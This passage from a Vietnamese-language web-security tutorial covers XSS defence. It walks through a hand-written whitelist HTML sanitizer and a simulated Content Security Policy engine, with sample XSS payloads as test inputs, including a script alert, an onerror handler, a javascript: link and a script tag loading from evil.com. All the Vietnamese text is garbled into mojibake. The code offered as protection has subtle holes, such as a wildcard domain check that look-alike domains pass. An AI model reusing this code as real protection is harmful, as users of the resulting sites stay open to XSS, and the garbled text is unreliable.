  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Comment KHÃ”NG Cáº¦N format â†’  ESCAPE (an toÃ n!) â”‚  â”‚
  â”‚  â”‚  Blog post Cáº¦N format     â†’  SANITIZE          â”‚  â”‚
  â”‚  â”‚  Username                 â†’  ESCAPE             â”‚  â”‚
  â”‚  â”‚  Email body (HTML email)  â†’  SANITIZE           â”‚  â”‚
  â”‚  â”‚  Chat message             â†’  ESCAPE             â”‚  â”‚
  â”‚  â”‚  Rich text editor output  â†’  SANITIZE           â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 8.2. Tá»± Viáº¿t â€” HTML Sanitizer (Whitelist Approach)!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HTML SANITIZER â€” Tá»° VIáº¾T Tá»ª Äáº¦U!
// Chá»‰ CHO PHÃ‰P cÃ¡c tag/attribute AN TOÃ€N (whitelist)!
// KHÃ”NG Cáº¦N DOMParser hoáº·c thÆ° viá»‡n!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

var HTMLSanitizer = (function () {
  // â‘  WHITELIST â€” Chá»‰ cho phÃ©p cÃ¡c tag nÃ y:
  var ALLOWED_TAGS = {
    b: true,
    i: true,
    u: true,
    em: true,
    strong: true,
    p: true,
    br: true,
    ul: true,
    ol: true,
    li: true,
    a: true,
    span: true,
    div: true,
    h1: true,
    h2: true,
    h3: true,
    h4: true,
    h5: true,
    h6: true,
    blockquote: true,
    code: true,
    pre: true,
  };

  // â‘¡ WHITELIST â€” Chá»‰ cho phÃ©p attributes nÃ y:
  var ALLOWED_ATTRS = {
    a: { href: true, title: true, target: true },
    span: { class: true },
    div: { class: true },
    p: { class: true },
  };

  // â‘¢ TOKENIZER â€” PhÃ¢n tÃ­ch HTML thÃ nh tokens:
  function tokenize(html) {
    var tokens = [];
    var i = 0;

    while (i < html.length) {
      if (html.charAt(i) === "<") {
        // TÃŒM tag:
        var tagEnd = html.indexOf(">", i);
        if (tagEnd === -1) {
          // KhÃ´ng tÃ¬m tháº¥y > â†’ text!
          tokens.push({
            type: "text",
            value: html.substring(i),
          });
          break;
        }

        var tagContent = html.substring(i + 1, tagEnd);

        // Closing tag?
        if (tagContent.charAt(0) === "/") {
          tokens.push({
            type: "close",
            tag: tagContent.substring(1).trim().toLowerCase(),
          });
        }
        // Self-closing hoáº·c opening tag:
        else {
          var parsed = parseTag(tagContent);
          tokens.push({
            type: "open",
            tag: parsed.tag,
            attrs: parsed.attrs,
            selfClosing: tagContent.charAt(tagContent.length - 1) === "/",
          });
        }

        i = tagEnd + 1;
      } else {
        // TEXT node:
        var nextTag = html.indexOf("<", i);
        if (nextTag === -1) nextTag = html.length;

        tokens.push({
          type: "text",
          value: html.substring(i, nextTag),
        });
        i = nextTag;
      }
    }

    return tokens;
  }

  // â‘£ PARSE TAG â€” TÃ¡ch tÃªn tag vÃ  attributes:
  function parseTag(content) {
    // XÃ³a / cuá»‘i (self-closing):
    if (content.charAt(content.length - 1) === "/") {
      content = content.substring(0, content.length - 1).trim();
    }

    var parts = content.split(/\s+/);
    var tag = parts[0].toLowerCase();
    var attrs = {};

    // Parse attributes:
    var attrString = content.substring(tag.length).trim();
    // Regex Ä‘Æ¡n giáº£n cho attr="value" hoáº·c attr='value':
    var attrPattern = /(\w+)\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+))/g;
    var match;

    while ((match = attrPattern.exec(attrString)) !== null) {
      var attrName = match[1].toLowerCase();
      var attrValue = match[2] || match[3] || match[4] || "";
      attrs[attrName] = attrValue;
    }

    return { tag: tag, attrs: attrs };
  }

  // â‘¤ VALIDATE URL â€” Cháº·n javascript: protocol!
  function isUrlSafe(url) {
    if (!url) return false;
    var lower = url.toLowerCase().trim();

    // Cháº·n javascript: protocol!
    if (lower.indexOf("javascript:") === 0) return false;
    // Cháº·n data: protocol (cÃ³ thá»ƒ chá»©a script)!
    if (lower.indexOf("data:") === 0) return false;
    // Cháº·n vbscript: protocol!
    if (lower.indexOf("vbscript:") === 0) return false;

    return true;
  }

  // â‘¥ SANITIZE â€” HÃ m chÃ­nh!
  function sanitize(html) {
    if (typeof html !== "string") return "";

    var tokens = tokenize(html);
    var result = "";
    var openTags = []; // Stack theo dÃµi tags Ä‘ang má»Ÿ

    for (var i = 0; i < tokens.length; i++) {
      var token = tokens[i];

      if (token.type === "text") {
        // Text â†’ escape HTML entities!
        result += escapeHTMLContent(token.value);
      } else if (token.type === "open") {
        // Tag cÃ³ trong whitelist?
        if (ALLOWED_TAGS[token.tag]) {
          result += "<" + token.tag;

          // Filter attributes:
          var allowedAttrs = ALLOWED_ATTRS[token.tag] || {};
          var attrKeys = Object.keys(token.attrs);

          for (var j = 0; j < attrKeys.length; j++) {
            var attrName = attrKeys[j];
            var attrValue = token.attrs[attrName];

            // Attribute cÃ³ trong whitelist?
            if (allowedAttrs[attrName]) {
              // Kiá»ƒm tra href:
              if (attrName === "href") {
                if (!isUrlSafe(attrValue)) {
                  continue; // Bá» QUA href nguy hiá»ƒm!
                }
              }

              // CHáº¶N event handlers (on...):
              if (attrName.indexOf("on") === 0) {
                continue; // Bá» QUA onclick, onerror...!
              }

              result +=
                " " + attrName + '="' + escapeHTMLContent(attrValue) + '"';
            }
          }

          if (token.selfClosing || token.tag === "br") {
            result += " />";
          } else {
            result += ">";
            openTags.push(token.tag);
          }
        }
        // Tag KHÃ”NG trong whitelist â†’ Bá» QUA tag, giá»¯ text!
      } else if (token.type === "close") {
        // Closing tag cÃ³ trong whitelist?
        if (ALLOWED_TAGS[token.tag]) {
          // TÃ¬m matching open tag:
          var lastOpen = openTags.lastIndexOf(token.tag);
          if (lastOpen !== -1) {
            result += "</" + token.tag + ">";
            openTags.splice(lastOpen, 1);
          }
        }
      }
    }

    // ÄÃ³ng cÃ¡c tag cÃ²n má»Ÿ:
    while (openTags.length > 0) {
      result += "</" + openTags.pop() + ">";
    }

    return result;
  }

  // â‘¦ ESCAPE HTML CONTENT (cho text nodes):
  function escapeHTMLContent(str) {
    var result = "";
    for (var i = 0; i < str.length; i++) {
      var char = str.charAt(i);
      switch (char) {
        case "&":
          result += "&amp;";
          break;
        case "<":
          result += "&lt;";
          break;
        case ">":
          result += "&gt;";
          break;
        case '"':
          result += "&quot;";
          break;
        case "'":
          result += "&#39;";
          break;
        default:
          result += char;
      }
    }
    return result;
  }

  return {
    sanitize: sanitize,
  };
})();

// â‘§ THá»¬ NGHIá»†M:
var tests = [
  // Test 1: Script tag â†’ XÃ“A!
  '<p>Hello</p><script>alert("XSS")</script>',
  // â†’ <p>Hello</p>alert(&quot;XSS&quot;)

  // Test 2: Event handler â†’ XÃ“A!
  '<img src="x" onerror="alert(1)">',
  // â†’ (img khÃ´ng trong whitelist â†’ xÃ³a tag)

  // Test 3: Safe HTML â†’ GIá»®!
  "<b>Bold</b> and <i>italic</i>",
  // â†’ <b>Bold</b> and <i>italic</i>

  // Test 4: javascript: URL â†’ XÃ“A href!
  '<a href="javascript:alert(1)">Click</a>',
  // â†’ <a>Click</a> (href bá»‹ xÃ³a!)

  // Test 5: Safe link â†’ GIá»®!
  '<a href="https://example.com" title="Example">Link</a>',
  // â†’ <a href="https://example.com" title="Example">Link</a>

  // Test 6: Nested attack â†’ Xá»¬ LÃ!
  '<div class="nice"><script>evil()</script><p>Safe</p></div>',
  // â†’ <div class="nice">evil()<p>Safe</p></div>
];

for (var i = 0; i < tests.length; i++) {
  console.log("Input " + (i + 1) + ":", tests[i]);
  console.log("Output:", HTMLSanitizer.sanitize(tests[i]));
  console.log("---");
}
```

```
  HTML SANITIZER â€” THUáº¬T TOÃN:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  INPUT: "<b>Hi</b><script>alert(1)</script>"           â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 1 â€” TOKENIZE:                                    â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Token 1: { type: 'open',  tag: 'b' }           â”‚  â”‚
  â”‚  â”‚  Token 2: { type: 'text',  value: 'Hi' }        â”‚  â”‚
  â”‚  â”‚  Token 3: { type: 'close', tag: 'b' }           â”‚  â”‚
  â”‚  â”‚  Token 4: { type: 'open',  tag: 'script' }      â”‚  â”‚
  â”‚  â”‚  Token 5: { type: 'text',  value: 'alert(1)' }  â”‚  â”‚
  â”‚  â”‚  Token 6: { type: 'close', tag: 'script' }      â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 2 â€” FILTER (Whitelist):                          â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Token 1: <b> â†’ trong whitelist? CÃ“! âœ… GIá»®!  â”‚  â”‚
  â”‚  â”‚  Token 2: "Hi" â†’ text â†’ ESCAPE â†’ "Hi" âœ…       â”‚  â”‚
  â”‚  â”‚  Token 3: </b> â†’ CÃ“ matching open? CÃ“! âœ…     â”‚  â”‚
  â”‚  â”‚  Token 4: <script> â†’ whitelist? KHÃ”NG! âŒ XÃ“A! â”‚  â”‚
  â”‚  â”‚  Token 5: "alert(1)" â†’ text â†’ ESCAPE âœ…        â”‚  â”‚
  â”‚  â”‚  Token 6: </script> â†’ KHÃ”NG whitelist! âŒ XÃ“A! â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  BÆ¯á»šC 3 â€” OUTPUT:                                       â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  "<b>Hi</b>alert(1)"                              â”‚  â”‚
  â”‚  â”‚  â†’ <b> vÃ  </b> GIá»®!                             â”‚  â”‚
  â”‚  â”‚  â†’ <script> XÃ“A!                                â”‚  â”‚
  â”‚  â”‚  â†’ "alert(1)" thÃ nh TEXT, KHÃ”NG CHáº Y!           â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§9. Content Security Policy (CSP) â€” HÃ ng PhÃ²ng Thá»§ Cuá»‘i!

### 9.1. CSP LÃ  GÃ¬?

```
  CSP â€” CONTENT SECURITY POLICY:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  CSP = Content Security Policy                         â”‚
  â”‚  = ChÃ­nh sÃ¡ch báº£o máº­t ná»™i dung!                       â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  CSP lÃ  HTTP Response Header:                    â”‚  â”‚
  â”‚  â”‚  Content-Security-Policy: <directives>           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  NÃ“ LÃ€M GÃŒ?                                     â”‚  â”‚
  â”‚  â”‚  â†’ Server NÃ“I cho browser:                      â”‚  â”‚
  â”‚  â”‚    "Chá»‰ Ä‘Æ°á»£c táº£i resource tá»« CÃC NGUá»’N NÃ€Y!"   â”‚  â”‚
  â”‚  â”‚    "KHÃ”NG Ä‘Æ°á»£c cháº¡y inline script!"              â”‚  â”‚
  â”‚  â”‚    "KHÃ”NG Ä‘Æ°á»£c dÃ¹ng eval()!"                     â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Browser TUÃ‚N THá»¦ vÃ  CHáº¶N má»i thá»© khÃ¡c!      â”‚  â”‚
  â”‚  â”‚  â†’ XSS chÃ¨n <script> â†’ Bá»Š CHáº¶N!               â”‚  â”‚
  â”‚  â”‚  â†’ XSS dÃ¹ng eval()   â†’ Bá»Š CHáº¶N!               â”‚  â”‚
  â”‚  â”‚  â†’ XSS dÃ¹ng inline   â†’ Bá»Š CHáº¶N!               â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 9.2. CSP Directives â€” Chi Tiáº¿t!

```
  CSP DIRECTIVES â€” QUY Táº®C CHI TIáº¾T:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
  â”‚  â”‚ Directive     â”‚ Kiá»ƒm soÃ¡t gÃ¬?                   â”‚   â”‚
  â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   â”‚
  â”‚  â”‚ default-src  â”‚ Fallback cho Táº¤T Cáº¢ directives  â”‚   â”‚
  â”‚  â”‚ script-src   â”‚ JavaScript (quan trá»ng nháº¥t!)    â”‚   â”‚
  â”‚  â”‚ style-src    â”‚ CSS                              â”‚   â”‚
  â”‚  â”‚ img-src      â”‚ HÃ¬nh áº£nh                         â”‚   â”‚
  â”‚  â”‚ font-src     â”‚ Font chá»¯                         â”‚   â”‚
  â”‚  â”‚ connect-src  â”‚ XHR, fetch, WebSocket            â”‚   â”‚
  â”‚  â”‚ frame-src    â”‚ iframe                           â”‚   â”‚
  â”‚  â”‚ object-src   â”‚ Plugins (Flash, Java)            â”‚   â”‚
  â”‚  â”‚ media-src    â”‚ Audio, Video                     â”‚   â”‚
  â”‚  â”‚ base-uri     â”‚ <base> tag                       â”‚   â”‚
  â”‚  â”‚ form-action  â”‚ Form submit destinations         â”‚   â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
  â”‚                                                        â”‚
  â”‚  SOURCE VALUES:                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  'self'          â†’ Chá»‰ tá»« CÃ™NG origin!         â”‚  â”‚
  â”‚  â”‚  'none'          â†’ CHáº¶N Táº¤T Cáº¢!               â”‚  â”‚
  â”‚  â”‚  'unsafe-inline' â†’ Cho phÃ©p inline (KHÃ”NG NÃŠN!)â”‚  â”‚
  â”‚  â”‚  'unsafe-eval'   â†’ Cho phÃ©p eval() (NGUY HIá»‚M!)â”‚  â”‚
  â”‚  â”‚  'nonce-xxx'     â†’ Chá»‰ script cÃ³ nonce phÃ¹ há»£p!â”‚  â”‚
  â”‚  â”‚  'sha256-xxx'    â†’ Chá»‰ script cÃ³ hash phÃ¹ há»£p! â”‚  â”‚
  â”‚  â”‚  https:          â†’ Chá»‰ tá»« HTTPS!               â”‚  â”‚
  â”‚  â”‚  *.trusted.com   â†’ Tá»« subdomain trusted.com!   â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 9.3. Tá»± Viáº¿t â€” MÃ´ Phá»ng CSP Engine!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CSP ENGINE â€” Tá»° VIáº¾T Tá»ª Äáº¦U!
// MÃ´ phá»ng cÃ¡ch browser kiá»ƒm tra CSP!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

var CSPEngine = (function () {
  // â‘  PARSE CSP HEADER:
  function parseCSP(headerValue) {
    var policy = {};

    // TÃ¡ch cÃ¡c directive:
    var directives = headerValue.split(";");

    for (var i = 0; i < directives.length; i++) {
      var parts = directives[i].trim().split(/\s+/);
      if (parts.length === 0 || !parts[0]) continue;

      var directiveName = parts[0].toLowerCase();
      var sources = [];

      for (var j = 1; j < parts.length; j++) {
        sources.push(parts[j].toLowerCase());
      }

      policy[directiveName] = sources;
    }

    return policy;
  }

  // â‘¡ KIá»‚M TRA ORIGIN CÃ“ KHá»šP Vá»šI SOURCE KHÃ”NG:
  function matchesSource(origin, source) {
    // 'self' â†’ cÃ¹ng origin:
    if (source === "'self'") {
      return origin === "SELF";
    }

    // 'none' â†’ cháº·n táº¥t cáº£:
    if (source === "'none'") {
      return false;
    }

    // 'unsafe-inline' â†’ cho phÃ©p inline:
    if (source === "'unsafe-inline'") {
      return origin === "INLINE";
    }

    // 'unsafe-eval' â†’ cho phÃ©p eval:
    if (source === "'unsafe-eval'") {
      return origin === "EVAL";
    }

    // https: â†’ chá»‰ HTTPS:
    if (source === "https:") {
      return origin.indexOf("https://") === 0;
    }

    // Wildcard subdomain *.example.com:
    if (source.indexOf("*.") === 0) {
      var baseDomain = source.substring(2);
      return origin.indexOf(baseDomain) !== -1;
    }

    // Exact match:
    return origin === source;
  }

  // â‘¢ KIá»‚M TRA REQUEST CÃ“ ÄÆ¯á»¢C PHÃ‰P KHÃ”NG:
  function isAllowed(policy, resourceType, origin) {
    // TÃ¬m directive phÃ¹ há»£p:
    var directiveMap = {
      script: "script-src",
      style: "style-src",
      image: "img-src",
      font: "font-src",
      connect: "connect-src",
      frame: "frame-src",
    };

    var directive = directiveMap[resourceType] || "default-src";

    // TÃ¬m sources cho directive:
    var sources = policy[directive];

    // Náº¿u khÃ´ng cÃ³ directive â†’ fallback vá» default-src:
    if (!sources) {
      sources = policy["default-src"];
    }

    // Náº¿u khÃ´ng cÃ³ cáº£ default-src â†’ cho phÃ©p táº¥t cáº£:
    if (!sources) {
      return true;
    }

    // Kiá»ƒm tra tá»«ng source:
    for (var i = 0; i < sources.length; i++) {
      if (matchesSource(origin, sources[i])) {
        return true;
      }
    }

    return false; // CHáº¶N!
  }

  return {
    parseCSP: parseCSP,
    isAllowed: isAllowed,
  };
})();

// â‘£ THá»¬ NGHIá»†M:
var cspHeader =
  "default-src 'self'; " +
  "script-src 'self' https://cdn.trusted.com; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' https: data:; " +
  "connect-src 'self' https://api.mysite.com; " +
  "object-src 'none'";

var policy = CSPEngine.parseCSP(cspHeader);

// Test cÃ¡c request:
var tests = [
  { type: "script", origin: "SELF", desc: "Script tá»« cÃ¹ng origin" },
  {
    type: "script",
    origin: "https://cdn.trusted.com",
    desc: "Script tá»« CDN trusted",
  },
  { type: "script", origin: "https://evil.com", desc: "Script tá»« evil.com" },
  { type: "script", origin: "INLINE", desc: "Inline script (XSS!)" },
  { type: "script", origin: "EVAL", desc: "eval() (XSS!)" },
  { type: "style", origin: "INLINE", desc: "Inline style" },
  { type: "image", origin: "https://img.cdn.com", desc: "Image tá»« HTTPS" },
  { type: "connect", origin: "https://evil.com", desc: "XHR tá»›i evil.com" },
];

console.log("CSP KIá»‚M TRA:");
console.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
for (var i = 0; i < tests.length; i++) {
  var t = tests[i];
  var allowed = CSPEngine.isAllowed(policy, t.type, t.origin);
  console.log((allowed ? "âœ… CHO PHÃ‰P" : "âŒ CHáº¶N!  ") + " | " + t.desc);
}

// Output:
// CSP KIá»‚M TRA:
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// âœ… CHO PHÃ‰P | Script tá»« cÃ¹ng origin
// âœ… CHO PHÃ‰P | Script tá»« CDN trusted
// âŒ CHáº¶N!   | Script tá»« evil.com
// âŒ CHáº¶N!   | Inline script (XSS!)
// âŒ CHáº¶N!   | eval() (XSS!)
// âœ… CHO PHÃ‰P | Inline style
// âœ… CHO PHÃ‰P | Image tá»« HTTPS
// âŒ CHáº¶N!   | XHR tá»›i evil.com
```

```
  CSP â€” CHáº¶N XSS NHÆ¯ THáº¾ NÃ€O?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  KHÃ”NG CÃ“ CSP:                                         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  <script>alert('XSS')</script>                   â”‚  â”‚
  â”‚  â”‚  â†’ Browser: "OK! Cháº¡y thÃ´i!"                    â”‚  â”‚
  â”‚  â”‚  â†’ XSS THÃ€NH CÃ”NG! âŒ                            â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  CÃ“ CSP: script-src 'self':                            â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  <script>alert('XSS')</script>                   â”‚  â”‚
  â”‚  â”‚  â†’ Browser: "CSP nÃ³i KHÃ”NG inline script!"      â”‚  â”‚
  â”‚  â”‚  â†’ Browser: "ÄÃ¢y lÃ  inline â†’ CHáº¶N!"            â”‚  â”‚
  â”‚  â”‚  â†’ XSS Bá»Š CHáº¶N! âœ…                              â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  <script src="https://evil.com/xss.js"></script> â”‚  â”‚
  â”‚  â”‚  â†’ Browser: "CSP nÃ³i chá»‰ 'self'!"              â”‚  â”‚
  â”‚  â”‚  â†’ Browser: "evil.com â‰  self â†’ CHáº¶N!"          â”‚  â”‚
  â”‚  â”‚  â†’ XSS Bá»Š CHáº¶N! âœ…                              â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
